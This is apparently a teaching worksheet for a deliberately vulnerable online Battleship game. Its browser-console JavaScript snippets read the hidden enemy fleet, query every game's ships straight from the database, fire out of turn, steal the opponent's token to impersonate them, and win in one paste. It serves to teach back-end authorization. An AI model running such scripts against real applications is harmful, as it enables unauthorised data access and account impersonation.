# 🕵️ Hack Lab — break this Battleship

**https://bwai-battleship.netlify.app**

Play with a partner: one of you **Start a new game**, the other **Join** with the code.
Both press **Ready**. Then try every hack below.

**Setup:** right-click → **Inspect** → **Console** tab. If Chrome warns you about
pasting, type `allow pasting` and press Enter once.

For every hack: **guess what will happen before you press Enter.** 🎲

---

## Hack 1 · Find the enemy fleet 🔍

**No code:** open the **Network** tab → click on the board or refresh → click
**get-state** → **Response** → look inside `ships`. What do you see?

**Or draw it as a map** (Console):
```js
const res = await fetch('/.netlify/functions/get-state', {
  method: 'POST',
  body: JSON.stringify({ token: me.token }),
}).then((r) => r.json());
const map = Array.from({ length: 10 }, () => Array(10).fill('·'));
res.ships
  .filter((s) => s.seat !== me.seat)
  .forEach((s) => s.cells.forEach(([row, col]) => (map[row][col] = '🚢')));
console.table(map);
```

❓ The enemy board on your screen is empty. **So how did the ships get into your browser?**

---

## Hack 2 · Ask the database directly 🗃️

```js
await db.from('ships').select().eq('game_id', me.gameId).neq('seat', me.seat)
```

Now try it without the filters — **every ship from every game**:
```js
await db.from('ships').select()
```

❓ This didn't go through the back end at all. **Who let you in?**

---

## Hack 3 · Fire when it's not your turn 🔁

Fire once normally, so it says **"Their turn…"**. Your board is locked. Now:
```js
await fetch('/.netlify/functions/fire', {
  method: 'POST',
  body: JSON.stringify({ token: me.token, row: 5, col: 5 }),
}).then((r) => r.json())
```

Want more? Fire a whole row while they're still thinking:
```js
for (let col = 0; col < 10; col++)
  await fetch('/.netlify/functions/fire', {
    method: 'POST',
    body: JSON.stringify({ token: me.token, row: 3, col }),
  });
```

❓ The board was locked. **Why didn't that stop you?**

---

## Hack 4 · Steal their identity 🎟️

Look at the other player's secret token:
```js
state.players
```

**4a · Waste their turn.** On **their** turn, fire *as them* at empty water:
```js
const them = state.players.find((p) => p.seat !== me.seat);
await fetch('/.netlify/functions/fire', {
  method: 'POST',
  body: JSON.stringify({ token: them.token, row: 9, col: 9 }),
}).then((r) => r.json())
```

**4b · Become them.** Your page reloads as *their* screen:
```js
const them = state.players.find((p) => p.seat !== me.seat);
sessionStorage.battleship = JSON.stringify({ ...me, seat: them.seat, token: them.token });
location.reload();
```

❓ The back end checks your token on every move. **So why did this work?**

---

## Final boss · Win in one paste 😈

Once both fleets are placed:
```js
const token = me.token;
const post = (name, body) => fetch(`/.netlify/functions/${name}`, {
  method: 'POST', body: JSON.stringify(body),
}).then((r) => r.json());
const { ships, seat } = await post('get-state', { token });
for (const s of ships.filter((s) => s.seat !== seat))
  for (const [row, col] of s.cells) await post('fire', { token, row, col });
```

❓ Which hacks did this one combine?

---

## Your mission

For each hack, write one sentence: **what should the back end have done instead?**
Then check your answer against the **5-question recipe** — which question did this
game get wrong?
